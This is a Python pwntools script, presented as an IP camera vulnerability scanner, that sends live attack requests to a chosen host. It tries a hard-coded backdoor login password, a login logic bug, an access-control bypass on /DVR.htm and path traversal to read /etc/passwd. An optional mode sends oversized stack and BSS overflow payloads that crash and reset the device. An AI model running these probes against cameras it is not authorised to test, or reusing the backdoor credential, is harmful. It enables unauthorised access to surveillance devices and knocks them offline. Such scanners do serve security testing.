from pwn import *
import requests
import argparse
import sys
import time
from termcolor import colored, cprint

parser = argparse.ArgumentParser(description='------------------ IP camera vuln scanner ------------------')
parser.add_argument('--target', help='target host', required=True)
parser.add_argument('--port', help='target port', required=True)
parser.add_argument('--bof', help='check buffer-overflow vuln (device will crash and reset)', action='store_true')

args = parser.parse_args()
target_host = args.target
target_port = args.port

vuln = colored('Vulnerable', 'red', attrs=['bold'])
ok = colored('Safe', 'green', attrs=['bold'])
telerr = colored ('No telnet connection', 'white', 'on_red')

def check5time():
	login = "POST /Login.htm HTTP/1.1 command=login&username=admin&password=123abcThisPasswordCantBeRightcba321"
	for x in range(5):
		r = remote(target_host, target_port)
		r.sendline(login)
		data = len(r.recvall()) 
	if data >= 20000:
		log.info ("Result: " + vuln)
	else:
		log.info ("Result: " + ok)

def pwdbackdoor():
	pwd = "command=login&username=admin&password=I0TO5Wv9"
	link = "http://" + target_host + "/Login.htm"
	try:
		t = remote(target_host, target_port)	
		r = requests.post(link, data=pwd)
		t.close() 
		if len(r.text) >= 20000:
			log.info ("Result: " + vuln)
		else:
			log.info ("Result: " + ok)
	except:
		log.info ("No connection")

def brokenac():
	bypass = "POST /DVR.htm HTTP/1.1"
	r = remote(target_host, target_port)
	r.sendline(bypass)
	data = len(r.recvall()) 
	if data >= 20000:
		log.info ("Result: " + vuln)
	else:
		log.info ("Result: " + ok)


def pathtravel():
	path = "POST ../../etc/passwd HTTP/1.1"
	r = remote(target_host, target_port)
	r.sendline(path)
	r.recvuntil("Expires: 0\n", timeout=5)
	r.recvline()
	data = r.recvuntil("root", timeout=5)
	r.recvall()
	r.close()	
	if data == b'root':
		log.info ("Result: " + vuln)
	else:
		log.info ("Result: " + ok)

def stackbof():
	payload = "GET " + "a"*1000 + " HTTP"
	r = remote(target_host, target_port)
	r.sendline(payload)
	r.recvall()	
	r.close()
	try:
		r = remote(target_host, target_port)
		r.close()		
		log.info ("Result: " + ok)
	except:
		log.info ("Result: " + vuln)

def bssbof():
	payload = "POST /Login.htm HTTP/1.1 command=login&username=admin&password=" + 'a'*1000
	r = remote(target_host, target_port)
	r.sendline(payload)
	r.recvall()	
	r.close()
	try:
		r = remote(target_host, target_port)
		r.close()		
		log.info ("Result: " + ok)
	except:
		log.info ("Result: " + vuln)

print ("------------------ IP camera vuln scanner ------------------")
print ("*************** Check for hard-code password ***************")
pwdbackdoor()
print ("**************** Check for login logic bug ****************")
check5time()
print ("**************** Check for broken access control ****************")
brokenac()
print ("**************** Check for path traversal ****************")
pathtravel()
if args.bof:
	print ("**************** Check for buffer overflow ****************")
	print ("Checking stack overflow")	
	stackbof()
	d = 0
	print ("Checking bss overflow")
	for x in range(5):
		try:
			r = remote(target_host, target_port)		
			r.close()
			d = 1
			break
		except:
			time.sleep(60)
	if (d):	
		bssbof()
	else:
		log.info ("Lost connection")
